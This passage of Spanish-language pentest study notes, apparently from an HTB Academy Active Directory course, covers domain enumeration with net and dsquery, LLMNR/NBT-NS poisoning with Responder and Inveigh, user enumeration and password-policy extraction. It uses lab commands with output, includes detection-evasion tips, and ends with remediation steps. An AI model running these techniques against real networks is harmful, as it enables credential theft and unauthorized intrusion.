| `net view /all /domain[:nombre_dominio]`       | Recursos compartidos de todos los dominios o de uno específico                       |
| `net view \\equipo /ALL`                       | Lista de recursos compartidos de un equipo específico                                |
| `net view /domain`                             | Lista de equipos del dominio                                                         |
##### Listando grupos de dominio

```powershell-session
PS C:\htb> net group /domain

The request will be processed at a domain controller for domain INLANEFREIGHT.LOCAL.
```

##### Información sobre un usuario de dominio

```powershell-session
PS C:\htb> net user /domain wrouse

The request will be processed at a domain controller for domain INLANEFREIGHT.LOCAL.

User name                    wrouse
Full Name                    Christopher Davis
...SNIP...
```

Si sospechas que los defensores de red monitorizan el comando `net`, puedes usar `net1` en su lugar. Ambas invocaciones realizan las mismas funciones sin disparar alertas basadas en la cadena `net`.
### Dsquery

Dsquery es una útil herramienta de línea de comandos para encontrar objetos en Active Directory. Las consultas que realizamos con esta herramienta pueden replicarse fácilmente con herramientas como BloodHound o PowerView, pero quizá no siempre dispongamos de ellas, como comentamos al principio de la sección. Además, es probable que los administradores de dominio la tengan instalada en su entorno. En ese sentido, dsquery estará presente en cualquier equipo con el rol de Servicios de dominio de Active Directory instalado, y la DLL de dsquery (dsquery.dll) existe por defecto en todos los sistemas Windows modernos, ubicada en `C:\Windows\System32\dsquery.dll`.

##### Búsqueda de usuarios

```powershell-session
PS C:\htb> dsquery user
```

##### Búsqueda de ordenador

```powershell-session
PS C:\htb> dsquery computer
```

##### Búsqueda mediante Wildcard

```powershell-session
PS C:\htb> dsquery * "CN=Users,DC=INLANEFREIGHT,DC=LOCAL"
```

Un **wildcard** (o comodín) es un carácter especial que sirve para representar uno o varios caracteres desconocidos o variables en una cadena de búsqueda. En LDAP y en muchos comandos de Windows, el comodín más habitual es el asterisco (`*`), que significa “cualquier secuencia de caracteres (incluido ningún carácter)”. Podemos ver [aquí](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754232(v=ws.11)) diferentes wildcards y su propósito.

Si quisieras buscar, por ejemplo, todos los usuarios cuyo nombre contenga “test”, podrías usar algo así:

```powershell
dsquery user "DC=INLANEFREIGHT,DC=LOCAL" -name *test*
```

Aquí:

- `user` indica que buscamos objetos de tipo usuario.    
- `"DC=INLANEFREIGHT,DC=LOCAL"` es la base DN donde comenzamos la búsqueda.    
- `-name *test*` aplica el wildcard antes y después de “test”, para que devuelva nombres como “test”, “testUser” o “mytest123”.    

Otros ejemplos de uso de comodines en LDAP:
- `cn=admin*` → cualquier `cn` que empiece por “admin” (p.ej. “administrator”, “admin01”).    
- `sAMAccountName=*svc*` → cualquier cuenta cuyo nombre contenga “svc”.    

En resumen, para que un wildcard funcione debes colocarlo dentro de un filtro (p. ej. `-name`, `-filter`) y no simplemente como base DN.

Podemos, por supuesto, combinar **dsquery** con filtros de búsqueda LDAP a medida. El siguiente ejemplo busca usuarios que tengan el flag `PASSWD_NOTREQD` establecido en el atributo `userAccountControl`:

```powershell-session
PS C:\htb> dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl

  distinguishedName                                                                              userAccountControl
  CN=Guest,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                                    66082
```

##### Buscando controladores de dominio

```powershell-session
PS C:\Users\forend.INLANEFREIGHT> dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName

 sAMAccountName
 ACADEMY-EA-DC01$
```

### Filtrado LDAP explicado

Verás en las consultas anteriores que usamos cadenas como `userAccountControl:1.2.840.113556.1.4.803:=8192`. Estas cadenas son consultas LDAP comunes que también pueden emplearse con varias herramientas, entre ellas AD PowerShell, ldapsearch y muchas otras. Desglosemos rápidamente:

- `userAccountControl:1.2.840.113556.1.4.803:` indica que estamos filtrando por los atributos de User Account Control (UAC) de un objeto. Esta parte puede cambiar para incluir distintos valores (OID u Object Identifiers) según lo que busquemos en AD.
    
- `=8192` representa la máscara de bits decimal que queremos coincidir en esta búsqueda. Este número decimal corresponde a un flag de UAC concreto (por ejemplo, “password no requerido” o “cuenta bloqueada”). Estos valores pueden combinarse para dar lugar a múltiples flags simultáneos. A continuación tienes una lista rápida de posibles valores.

##### Valores UAC

![[UAC.png | 800]]

##### Cadenas de coincidencia OID

Los OID son reglas que se usan para comparar valores de bits con atributos, como vimos más arriba. Para LDAP y AD, existen tres reglas principales de coincidencia:

- **1.2.840.113556.1.4.803**  
Al usar esta regla, como en el ejemplo anterior, indicamos que el valor de bits debe coincidir por completo para cumplir los requisitos de búsqueda. Ideal para detectar un único atributo.

- **1.2.840.113556.1.4.804**  
Con esta regla, pedimos que los resultados incluyan cualquier objeto en el que coincida al menos un bit del conjunto. Útil cuando un objeto tiene varios atributos activos.

- **1.2.840.113556.1.4.1941**  
Esta regla se emplea para filtrar sobre el Distinguished Name de un objeto y busca a través de todas las entradas de pertenencia y propiedad anidadas.

##### Operadores lógicos

Al crear filtros LDAP podemos usar operadores lógicos para combinar criterios:

- **& (AND)**: obliga a que coincidan todos los criterios, p. ej.  
    `(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))`  
    busca usuarios con el flag UAC 64 (“Password Can’t Change”).       
- **| (OR)**: basta que coincida uno, útil para agrupar diferentes atributos.    
- **! (NOT)**: invierte el criterio, p. ej.  
    `(&(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=64))`  
    busca usuarios que **no** tengan ese flag.    

Combinando estos operadores con filtros UAC y reglas OID obtenemos búsquedas muy precisas en AD.

# LLMNR-NBT-NS Poisoning

## Desde Linux

En este punto ya se ha completado la enumeración inicial del dominio: se ha obtenido información básica de usuarios y grupos, identificado hosts clave como el controlador de dominio y determinado el esquema de nombres usado.
Ahora comienza una nueva fase con dos técnicas clave:

- **Network poisoning** (envenenamiento de red)    
- **Password spraying**    

El objetivo es conseguir credenciales válidas en texto claro de un usuario de dominio, lo que permitirá avanzar con enumeración autenticada.
Se utilizarán ataques tipo **Man-in-the-Middle** contra los protocolos **LLMNR** y **NBT-NS**, que pueden revelar hashes o credenciales en texto claro. Aunque no se cubre en este módulo, esos hashes también pueden usarse en ataques **SMB relay** para autenticarse en otros equipos sin necesidad de crackear la contraseña.

#### LLMNR & NBT-NS Primer

**LLMNR (Link-Local Multicast Name Resolution)** y **NBT-NS (NetBIOS Name Service)** son mecanismos de resolución de nombres que Windows utiliza cuando el DNS falla.

- **LLMNR** usa el puerto UDP 5355 y permite que los hosts en la misma red local se consulten entre sí.    
- Si LLMNR falla, se usa **NBT-NS**, que utiliza UDP 137 y resuelve nombres NetBIOS en la red local.    

El problema es que **cualquier máquina en la red puede responder a estas peticiones**, lo que permite realizar ataques de envenenamiento con herramientas como **Responder**. Este ataque consiste en simular que tu máquina es la que tiene la respuesta a esas solicitudes, provocando que la víctima se conecte a ti. Si eso implica autenticación, puedes capturar **hashes NetNTLM** y luego:

- Crackearlos offline para obtener la contraseña en claro    
- Reutilizarlos directamente mediante **SMB relay** o contra otros servicios como LDAP    

Cuando no hay **SMB signing**, este tipo de ataque puede dar acceso administrativo en la red. El módulo de **movimiento lateral** cubrirá más adelante el ataque SMB relay en profundidad.

#### Ejemplo rápido de envenenamiento LLMNR/NBT-NS

1. Un usuario intenta conectarse a `\\print01.inlanefreight.local`, pero por error escribe `\\printer01.inlanefreight.local`.    
2. El servidor DNS responde que ese host no existe.    
3. El equipo del usuario lanza una petición LLMNR/NBT-NS preguntando a la red si alguien conoce ese nombre.    
4. El atacante (con **Responder** en ejecución) responde haciéndose pasar por ese host.    
5. El equipo víctima **cree la respuesta** y envía una **solicitud de autenticación**, incluyendo el nombre de usuario y el hash **NetNTLMv2**.    
6. El atacante puede entonces:    
    - **Crackear el hash offline**, o        
    - Usarlo en un ataque **SMB relay** si las condiciones lo permiten

Se busca capturar **hashes NTLMv1 y NTLMv2** transmitidos por la red, para luego **crackearlos offline** con herramientas como **Hashcat** o **John**, y así obtener la **contraseña en claro**. Esto permite:

- Obtener un primer acceso al dominio.    
- Escalar privilegios si se captura el hash de una cuenta con más permisos que la actual.

| Herramienta    | Descripción                                                                                                                                             |
| -------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Responder**  | Herramienta en Python diseñada para envenenar tráfico LLMNR, NBT-NS y MDNS. Muy utilizada desde hosts Linux. También tiene versión `.exe` para Windows. |
| **Inveigh**    | Plataforma MITM escrita en C# y PowerShell. Permite realizar ataques de spoofing y envenenamiento.                                                      |
| **Metasploit** | Incluye módulos para escaneo y spoofing en este tipo de ataques.                                                                                        |

##### Protocolos que pueden ser atacados

LLMNR, NBT-NS, mDNS, DNS, DHCP, ICMP, HTTP, HTTPS, SMB, LDAP, WebDAV, Proxy Auth

**Responder** además soporta MSSQL, DCE-RPC, FTP, POP3, IMAP, SMTP.

**Responder** es una herramienta sencilla pero muy potente, con múltiples funcionalidades. Antes la usamos en modo pasivo (`-A`), donde solo **escuchaba** tráfico sin intervenir.

Ahora pasamos al **modo activo**, donde empezará a **responder a peticiones LLMNR/NBT-NS** y otras, realizando envenenamiento para capturar hashes NTLM.

##### Opciones clave del comando `responder`:

- `-I <interfaz>` o `-i <IP>`: obligatorio especificar interfaz o IP.    
- `-A`: modo análisis (pasivo, solo escucha).    
- `-f`: intenta identificar el sistema operativo remoto.    
- `-w`: activa el servidor proxy WPAD (muy útil en redes grandes).    
- `-wf`: activa WPAD y fingerprinting.    
- `-v`: modo verboso (muestra más info en pantalla).    
- `-F` y `-P`: fuerzan autenticación NTLM o Basic, pero pueden generar prompts visibles (usar con precaución).

##### Resumen – Uso de hashes capturados con Responder

- **Responder** debe dejarse ejecutando (por ejemplo, en una sesión `tmux`) mientras seguimos con otras tareas de enumeración para maximizar la recolección de hashes.   
- **NTLMv2** es el tipo de hash más común que captura Responder. Se **crackea con Hashcat** usando el modo `5600`.    
- También pueden aparecer hashes **NTLMv1** u otros tipos. Para identificar el formato exacto y el modo adecuado en Hashcat, se puede consultar la página oficial de Hashcat example hashes.
- Los hashes obtenidos con Responder se guardan automáticamente en `/usr/share/Responder/logs/`

_Importante_: NTLMv2 no sirve para técnicas como pass the hash, por lo que debe crackearse offline para obtener la contraseña en claro. Para ello tiramos de hashcat o john the ripper. El módulo de hashcat correspondiente para romper hashes NTLMv2 es `5600`

## Desde Windows

El envenenamiento de LLMNR y NBT-NS también es posible desde un equipo con Windows.  
En la sección anterior utilizamos **Responder** para capturar hashes.  
En esta sección exploraremos la herramienta **Inveigh** e intentaremos capturar otro conjunto de credenciales.
##### Inveigh

Si terminamos utilizando un equipo con Windows como máquina de ataque, si el cliente nos proporciona una máquina Windows desde la que realizar pruebas, o si comprometemos una máquina Windows con privilegios de administrador local mediante otro vector de ataque y queremos escalar aún más nuestro acceso, la herramienta **Inveigh** funciona de forma similar a **Responder**, pero está escrita en **PowerShell y C#**.

Inveigh puede escuchar tráfico tanto IPv4 como IPv6, y cubrir varios protocolos, incluyendo:  
**LLMNR, DNS, mDNS, NBNS, DHCPv6, ICMPv6, HTTP, HTTPS, SMB, LDAP, WebDAV y Proxy Auth.**

La herramienta está disponible en el directorio `C:\Tools` de la máquina Windows proporcionada como equipo de ataque.

Podemos comenzar con la versión de PowerShell con el siguiente comando, y luego listar todos los parámetros posibles. Existe una wiki que documenta todos los parámetros y cómo se usa la herramienta.

```powershell-session
PS C:\htb> Import-Module .\Inveigh.ps1
PS C:\htb> (Get-Command Invoke-Inveigh).Parameters

Key                     Value
---                     -----
ADIDNSHostsIgnore       System.Management.Automation.ParameterMetadata
KerberosHostHeader      System.Management.Automation.ParameterMetadata
ProxyIgnore             System.Management.Automation.ParameterMetadata
PcapTCP                 System.Management.Automation.ParameterMetadata
PcapUDP                 System.Management.Automation.ParameterMetadata
SpooferHostsReply       System.Management.Automation.ParameterMetadata
SpooferHostsIgnore      System.Management.Automation.ParameterMetadata
SpooferIPsReply         System.Management.Automation.ParameterMetadata
SpooferIPsIgnore        System.Management.Automation.ParameterMetadata
WPADDirectHosts         System.Management.Automation.ParameterMetadata
WPADAuthIgnore          System.Management.Automation.ParameterMetadata
ConsoleQueueLimit       System.Management.Automation.ParameterMetadata
ConsoleStatus           System.Management.Automation.ParameterMetadata
ADIDNSThreshold         System.Management.Automation.ParameterMetadata
ADIDNSTTL               System.Management.Automation.ParameterMetadata
DNSTTL                  System.Management.Automation.ParameterMetadata
HTTPPort                System.Management.Automation.ParameterMetadata
HTTPSPort               System.Management.Automation.ParameterMetadata
KerberosCount           System.Management.Automation.ParameterMetadata
LLMNRTTL                System.Management.Automation.ParameterMetadata

<SNIP>
```

Empecemos con LLMNR y NBNS spoofind, e imprimirlo en la consola para escribirlo en un archivo. Dejamos el resto de configuraciones por defecto, como se puede ver aquí:

```powershell-session
PS C:\htb> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
...SNIP...
```

Vemos que inmediatamente obtenemos requests LLMNR y mDNS. 

![[inveigh.png]]
##### Inveigh en C# (InveighZero)

La versión original de Inveigh está escrita en PowerShell y **ya no recibe actualizaciones**.  
El autor de la herramienta mantiene actualmente la versión en **C#**, que combina el código en C# del PoC original con un **port en C# de la mayor parte del código de la versión en PowerShell**.

Antes de poder usar esta versión en C#, hay que compilar el ejecutable.  
Para ahorrar tiempo, se ha incluido una copia tanto de la versión PowerShell como de la **versión ya compilada en C#** en la carpeta `C:\Tools` del host de pruebas en el laboratorio.  
Aun así, merece la pena realizar el ejercicio (y seguir la buena práctica) de compilarla uno mismo usando **Visual Studio**.

Vamos a ejecutar la versión en C# con los parámetros por defecto y comenzar a capturar hashes.

```powershell-session
PS C:\htb> .\Inveigh.exe

[*] Inveigh 2.0.4 [Started 2022-02-28T20:03:28 | PID 6276]
[+] Packet Sniffer Addresses [IP 172.16.5.25 | IPv6 fe80::dcec:2831:712b:c9a3%8]
...SNIP...
```

Como podemos ver, la herramienta se inicia mostrando qué opciones están activadas por defecto y cuáles no.  
Las opciones marcadas con `[+]` están **activadas por defecto**, mientras que las que aparecen con `[ ]` están **desactivadas**.

La salida en consola también nos indica qué funciones están desactivadas y, por tanto, **no están enviando respuestas** (por ejemplo, `mDNS` en el ejemplo anterior).

También aparece el mensaje:  
**"Press ESC to enter/exit interactive console"**, que resulta muy útil mientras se ejecuta la herramienta.  
Esta consola interactiva permite acceder a las credenciales y hashes capturados, detener Inveigh, y más.

Podemos pulsar la tecla `ESC` para entrar en la consola interactiva mientras Inveigh está en ejecución.

```powershell-session
<SNIP>

[+] [20:10:24] LLMNR(A) request [academy-ea-web0] from 172.16.5.125 [response sent]
[+] [20:10:24] LLMNR(A) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [response sent]
[-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [type ignored]
[-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored]
[-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [type ignored]
[-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored]
[-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from fe80::f098:4f63:8384:d1d0%8 [type ignored]
[-] [20:10:24] LLMNR(AAAA) request [academy-ea-web0] from 172.16.5.125 [type ignored]
[.] [20:10:24] TCP(1433) SYN packet from 172.16.5.125:61310
[.] [20:10:24] TCP(1433) SYN packet from 172.16.5.125:61311
C(0:0) NTLMv1(0:0) NTLMv2(3:9)> HELP
```

Si le damos a `HELP` se nos presentan varias opciones, en especial, `GET NTLMV2UNIQUE` que nos permite ver hashes únicos capturados. También podemos escribir `GET NTLMV2USERNAMES` y ver qué usuarios hemos coleccionado. Esto es útil si queremos una lista de usuarios para realizar enumeración adicional y ver cuáles merecen la pena crackear offline con Hashcat. 

### Remediación 

> *Esto nos servirá para explicarlo en auditorías*

MITRE ATT&CK enumera esta técnica con el ID: **T1557.001**, **Adversary-in-the-Middle: LLMNR/NBT-NS Poisoning y SMB Relay**.

Existen varias formas de mitigar este ataque. Para asegurarse de que estos ataques de suplantación no sean posibles, se puede **deshabilitar LLMNR y NBT-NS**.

**Advertencia:** siempre es recomendable probar lentamente un cambio significativo como este en el entorno antes de implementarlo por completo.  
Como pentesters, **podemos recomendar estas medidas de mitigación**, pero debemos **comunicar claramente a nuestros clientes** que prueben estos cambios a fondo para asegurarse de que **desactivar ambos protocolos no rompe funcionalidades de la red**.

Para **deshabilitar LLMNR** desde la Directiva de Grupo (GPO), hay que ir a:

> `Configuración del equipo → Plantillas administrativas → Red → Cliente DNS`  
> y activar la opción **"Desactivar la resolución de nombres por multidifusión"**.

![[inveight2.png]]
**NBT-NS no puede deshabilitarse mediante directiva de grupo (GPO)**, sino que **debe deshabilitarse localmente en cada equipo**.  
Para hacerlo, sigue estos pasos:

1. Abre el **Centro de redes y recursos compartidos** desde el **Panel de control**.    
2. Haz clic en **Cambiar configuración del adaptador**.    
3. Haz clic derecho sobre el adaptador de red en uso y selecciona **Propiedades**.    
4. Selecciona **Protocolo de Internet versión 4 (TCP/IPv4)** y pulsa en **Propiedades**.    
5. Pulsa el botón **Opciones avanzadas...**.    
6. Ve a la pestaña **WINS**.    
7. Selecciona la opción **Desactivar NetBIOS sobre TCP/IP**.

![[inveight3.png]]
Aunque no es posible **deshabilitar NBT-NS directamente mediante GPO**, sí se puede **crear un script de PowerShell** que se ejecute en el **inicio** a través de:

`Configuración del equipo --> Configuración de Windows --> Scripts (Inicio/Apagado) --> Inicio`

Y dentro, añadir un script como este:

```powershell
$regkey = "HKLM:SYSTEM\CurrentControlSet\services\NetBT\Parameters\Interfaces"
Get-ChildItem $regkey | foreach { Set-ItemProperty -Path "$regkey\$($_.pschildname)" -Name NetbiosOptions -Value 2 -Verbose}
```

En el **Editor de directivas de grupo local**, será necesario hacer doble clic en **Inicio**, ir a la pestaña **Scripts de PowerShell**, y seleccionar la opción **"Para esta GPO, ejecutar scripts en el siguiente orden"** para que se ejecuten **primero los scripts de PowerShell de Windows**.

Después, haz clic en **Agregar** y selecciona el script que desees aplicar.

> Para que los cambios surtan efecto, será necesario **reiniciar el sistema objetivo** o **reiniciar el adaptador de red**.

Para aplicar esto a todos los hosts de un dominio, podríamos **crear una GPO** usando la **Consola de Administración de Directivas de Grupo** en el **Controlador de Dominio**, y **alojar el script en el recurso compartido SYSVOL** dentro de la carpeta de scripts, llamándolo mediante su ruta UNC, por ejemplo:

```
\\inlanefreight.local\SYSVOL\INLANEFREIGHT.LOCAL\scripts
```

Una vez aplicada la GPO a unidades organizativas (OU) específicas y **reiniciados los hosts**, el script se ejecutará en el siguiente arranque y **desactivará NBT-NS**, siempre que el script siga existiendo en el recurso SYSVOL y sea accesible por los hosts a través de la red.

![[inveight4.png]]

# Password Spraying

### SMB Null Session - Obtener listado de usuarios

Si estamos dentro de una máquina en la red interna pero no contamos con credenciales válidas del dominio, podemos intentar obtener una lista de usuarios recurriendo a sesiones SMB NULL o a enlaces LDAP anónimos hacia los controladores de dominio. Estas configuraciones, si están mal configuradas, permiten listar todos los usuarios del dominio y consultar la política de contraseñas sin autenticación previa.

Otra opción, si ya tienes acceso como usuario **SYSTEM** en algún host del dominio, es aprovechar que el sistema puede actuar como objeto de equipo y consultar directamente Active Directory. Si no dispones de ninguno de estos vectores, puedes generar una lista estimada de usuarios a partir de fuentes externas como LinkedIn o mediante técnicas de recolección de correos corporativos.

Para trabajar con sesiones SMB NULL o enlaces LDAP anónimos puedes apoyarte en herramientas como `enum4linux`, `rpcclient` o `CrackMapExec`. En cualquiera de los casos será necesario limpiar la salida para quedarte solo con los nombres de usuario, preferiblemente con un nombre por línea, para facilitar ataques posteriores. Esto lo podemos realizar con la flag `-U` con `enum4linux`.

```shell-session
amr251@htb[/htb]$ enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"

administrator
guest
krbtgt
lab_adm
htb-student

<SNIP>
```

Como ya sabemos, podemos usar `enumdomusers` si ganamos una sesión con `rpcclient -U "" -N <TARGET>`. Además, con `crackmapexec smb <TARGET> --users` podemos hacer lo mismo. Esta herramienta resulta útil porque también muestra el **badpwdcount**, es decir, el número de intentos fallidos de inicio de sesión. Gracias a esto, podemos eliminar de nuestra lista aquellos usuarios que estén cerca del umbral de bloqueo. También muestra el **baddpwdtime**, que indica la fecha y hora del último intento fallido de contraseña. Esto nos permite saber cuán cerca está una cuenta de que se le reinicie el contador de intentos fallidos.

En entornos con múltiples controladores de dominio, estos valores se mantienen de forma separada en cada uno. Para obtener un recuento preciso del número total de intentos fallidos de una cuenta, habría que consultar cada DC individualmente y sumar los valores, o bien consultar directamente al controlador que tiene el rol **PDC Emulator**.

### Recopilando usuarios con LDAP anónimo

Cuando se permite la **vinculación anónima por LDAP**, podemos aprovecharlo para obtener una lista de usuarios del dominio. Hay varias herramientas que permiten hacer esto, como `windapsearch` o `ldapsearch`. Si optamos por `ldapsearch`, necesitaremos especificar un filtro de búsqueda LDAP válido. Estos filtros determinan qué tipo de objetos queremos recuperar del Directorio Activo, y se explican en detalle en el módulo dedicado a LDAP en Active Directory.

##### Usando ldapsearch

```shell-session
[!bash!]$ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "

guest
ACADEMY-EA-DC01$
```

Herramientas como `windapsearch` hacen más fácil esto (aunque deberíamos entender cómo crear nuestros propios filtros de búsqueda LDAP). Aquí podemos especificar acceso anónimo con un usuario en blanco (flag `-u`) y la flag `-U` para decirle a la herramienta que obtenga solo usuarios

##### Usando windapsearch

```shell-session
$ ./windapsearch.py --dc-ip 172.16.5.5 -u "" -U

[+] No username provided. Will try anonymous bind.
[+] Using Domain Controller at: 172.16.5.5
[+] Getting defaultNamingContext from Root DSE
[+]	Found: DC=INLANEFREIGHT,DC=LOCAL
[+] Attempting bind
[+]	...success! Binded as: 
[+]	 None

[+] Enumerating all AD users
[+]	Found 2906 users: 
```

### Enumerando usuarios con Kerbrute

Si no tenemos ningún tipo de acceso en la red interna, podemos utilizar **Kerbrute** tanto para enumerar cuentas válidas de Active Directory como para hacer **password spraying**. Esta herramienta aprovecha la **preautenticación de Kerberos**, que es más rápida y sigilosa que otros métodos, ya que **no genera eventos como el ID 4625** (fallos de inicio de sesión), lo que la hace menos detectable.

Kerbrute envía peticiones TGT al controlador de dominio sin preautenticación. Si el KDC responde con **PRINCIPAL UNKNOWN**, el usuario no existe. Si solicita preautenticación, significa que el usuario es válido. Esta técnica permite enumerar usuarios sin bloquear cuentas ni generar alertas. Sin embargo, **al pasar al password spraying**, los intentos fallidos sí se contabilizan y pueden bloquear cuentas, por lo que hay que actuar con precaución.

Se puede probar con listas como `jsmith.txt`, que contiene más de 48.000 usuarios en formato `flast`. El repositorio _statistically-likely-usernames_ de GitHub es una buena fuente para este tipo de ataques.

##### Enumeración de usuarios con kerbrute

```shell-session
$ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 
```

Con Kerbrute, hemos comprobado más de 48.000 nombres de usuario en solo 12 segundos, descubriendo más de 50 válidos. Aunque este método no genera eventos de fallo de inicio de sesión, sí provoca el **evento 4768** ("se solicitó un ticket de autenticación Kerberos") si el registro de eventos de Kerberos está habilitado por directiva de grupo. Los defensores pueden configurar su SIEM para detectar un pico de estos eventos, lo que podría delatar la actividad.

Si no conseguimos generar una lista de usuarios válidos con técnicas internas, siempre podemos recurrir a **OSINT**, buscando correos corporativos o usando herramientas como **linkedin2username**, que generan nombres de usuario a partir de perfiles de empleados en LinkedIn. Esto puede ayudarnos a construir diccionarios para intentos posteriores.

### Enumeración credencializada para construir nuestra lista de usuarios

Con credenciales válidas, podemos emplear cualquiera de las herramientas mencionadas anteriormente para generar una lista de usuarios. Una de las formas más rápidas y sencillas de hacerlo es utilizando **CrackMapExec**, que permite enumerar directamente los usuarios del dominio desde un sistema Linux autenticado en la red interna. Esto facilita la recopilación de objetivos potenciales para ataques como el password spraying o la escalada de privilegios.

# Enumerando política de contraseñas

> Como vimos en la sección anterior, podemos obtener la política de contraseña de dominio de diferentes formas, dependiendo de cómo el dominio es configurado y si tenemos o no credenciales válidas de dominio. Con credenciales válidas de dominio, la política de contraseñas puede ser obtenida remotamente con CrackMapExec o rpcclient

```shell-session
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
```

### Enumeración de la política de contraseñas desde Linux (SMB NULL Sessions)

Aunque no tengamos credenciales, podemos intentar obtener la **política de contraseñas** del dominio mediante una **SMB NULL session** (o una conexión anónima por LDAP, aunque aquí se habla solo de SMB).

Una **SMB NULL session** es una conexión sin autenticación a servicios compartidos del dominio, que permite enumerar información como:

- Lista de usuarios, grupos y equipos    
- Atributos de cuentas    
- Política de contraseñas del dominio    

Estas sesiones anónimas son un fallo común, sobre todo en **controladores de dominio antiguos** que se han actualizado con configuraciones heredadas inseguras.

Con `rpcclient`:

```
rpcclient -U "" -N 192.168.X.X
rpcclient> querydominfo
Domain:		INLANEFREIGHT
Server:		
Comment:	
Total Users:	3650
Total Groups:	0
Total Aliases:	37
Sequence No:	1
Force Logoff:	-1
Domain Server State:	0x1
Server Role:	ROLE_DOMAIN_PDC
Unknown 3:	0x1
```

También podemos obtener la política de contraseñas. Podemos ver que es bastante débil, permitiendo una contraseña mínima de 8 caracteres:

```shell-session
rpcclient $> getdompwinfo
min_password_length: 8
password_properties: 0x00000001
	DOMAIN_PASSWORD_COMPLEX
```

Podemos utilizar la ya conocida `enum4linux` o `enum4linux-ng` con el mismo fin:

```shell-session
amr251@htb[/htb]$ enum4linux -P 172.16.5.5

<SNIP>

 ================================================== 
|    Password Policy Information for 172.16.5.5    |
 ================================================== 

[+] Attaching to 172.16.5.5 using a NULL share
[+] Trying protocol 139/SMB...

	[!] Protocol failed: Cannot request session (Called Name:172.16.5.5)

[+] Trying protocol 445/SMB...
[+] Found domain(s):

	[+] INLANEFREIGHT
	[+] Builtin

[+] Password Info for Domain: INLANEFREIGHT

	[+] Minimum password length: 8
	[+] Password history length: 24
	[+] Maximum password age: Not Set
	[+] Password Complexity Flags: 000001

		[+] Domain Refuse Password Change: 0
		[+] Domain Password Store Cleartext: 0
		[+] Domain Password Lockout Admins: 0
		[+] Domain Password No Clear Change: 0
		[+] Domain Password No Anon Change: 0
		[+] Domain Password Complex: 1

	[+] Minimum password age: 1 day 4 minutes 
	[+] Reset Account Lockout Counter: 30 minutes 
	[+] Locked Account Duration: 30 minutes 
	[+] Account Lockout Threshold: 5
	[+] Forced Log off Time: Not Set

[+] Retieved partial password policy with rpcclient:

Password Complexity: Enabled
Minimum Password Length: 8

enum4linux complete on Tue Feb 22 17:39:29 2022
```

### Enumerando sesiones nulas desde Windows

Es menos común realizar este tipo de ataque de sesión nula desde Windows, pero se puede hacer utilizando el siguiente comando:

```
net use \\host\ipc$ "" /u:""
```

Tambiém podamos usar una combinación de usuario/contraseña para intentar conectarnos. Vamos a ver algunos errores comunes cuando tratemos de autenticarnos:

**Error: Account is Disabled**

```cmd-session
C:\htb> net use \\DC01\ipc$ "" /u:guest
System error 1331 has occurred.

This user can't sign in because this account is currently disabled.
```

**Error: Password is Incorrect**

```cmd-session
C:\htb> net use \\DC01\ipc$ "password" /u:guest
System error 1326 has occurred.

The user name or password is incorrect.
```

**Error: Account is locked out (Password Policy**

```cmd-session
C:\htb> net use \\DC01\ipc$ "password" /u:guest
System error 1909 has occurred.

The referenced account is currently locked out and may not be logged on to.
```

### Enumerando la política de contraseñas desde Linux - LDAP bind anónimo

Las **LDAP anonymous binds** permiten que atacantes no autenticados extraigan información del dominio (usuarios, grupos, equipos, atributos de cuentas y políticas de contraseñas). Aunque esta configuración es heredada y desde **Windows Server 2003** se requiere autenticación para peticiones LDAP, todavía se encuentra en algunos entornos mal configurados (por ejemplo, cuando un administrador habilita el acceso anónimo para una aplicación y termina concediendo más privilegios de los previstos).

Desde Linux, se puede aprovechar una _bind_ anónima utilizando herramientas como:

- `windapsearch.py`    
- `ldapsearch`    
- `ad-ldapdomaindump.py`    

Aunque `ldapsearch` puede ser algo engorroso, es válido para extraer la política de contraseñas del dominio.

##### Usando ldapsearch

```shell-session
amr251@htb[/htb]$ ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

forceLogoff: -9223372036854775808
lockoutDuration: -18000000000
lockOutObservationWindow: -18000000000
lockoutThreshold: 5
maxPwdAge: -9223372036854775808
minPwdAge: -864000000000
minPwdLength: 8
modifiedCountAtLastProm: 0
nextRid: 1002
pwdProperties: 1
pwdHistoryLength: 24
```

> *Aquí podemos ver la longitud mínima de 8 caracteres para las contraseñas, intentos hasta bloqueo de 5, y complejidad de contraseñas (`pwdProperties` a 1)*

### Enumerando la política de contraseñas desde Windows

Si podemos autenticarnos en el dominio desde un host Windows, podemos usar comandos nativos como `net.exe` para consultar la política de contraseñas. También existen herramientas como:

- PowerView    
- CrackMapExec (versión para Windows)    
- SharpMapExec    
- SharpView    

El uso de herramientas integradas resulta útil cuando no podemos transferir binarios externos (por restricciones o control del cliente).

##### Usando net.exe

```cmd-session
C:\htb> net accounts

Force user logoff how long after time expires?:       Never
Minimum password age (days):                          1
Maximum password age (days):                          Unlimited
Minimum password length:                              8
Length of password history maintained:                24
Lockout threshold:                                    5
Lockout duration (minutes):                           30
Lockout observation window (minutes):                 30
Computer role:                                        SERVER
```

##### Usando PowerView

```powershell-session
PS C:\htb> import-module .\PowerView.ps1
PS C:\htb> Get-DomainPolicy

Unicode        : @{Unicode=yes}
